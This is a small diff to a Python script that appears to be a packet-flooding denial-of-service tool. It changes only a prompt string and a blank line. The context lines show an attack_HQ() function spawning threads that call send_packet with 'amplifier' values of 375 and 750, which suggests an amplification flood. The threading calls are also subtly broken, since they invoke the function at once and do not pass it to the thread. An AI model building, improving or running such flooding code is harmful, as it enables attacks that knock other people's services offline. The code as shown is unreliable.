@@ -57,7 +57,7 @@ print('''
 ''')
 sys.stdout.flush()
 
-loops = int(input("Enter a number of packets to send: "))
+loops = int(input("Enter amount of times to run the program: "))
 
 def send_packet(amplifier):
     try:
@@ -81,4 +81,5 @@ def attack_HQ():
             threading.Thread(target=send_packet(375), daemon=True).start()
             threading.Thread(target=send_packet(750), daemon=True).start()
             
+
 attack_HQ()
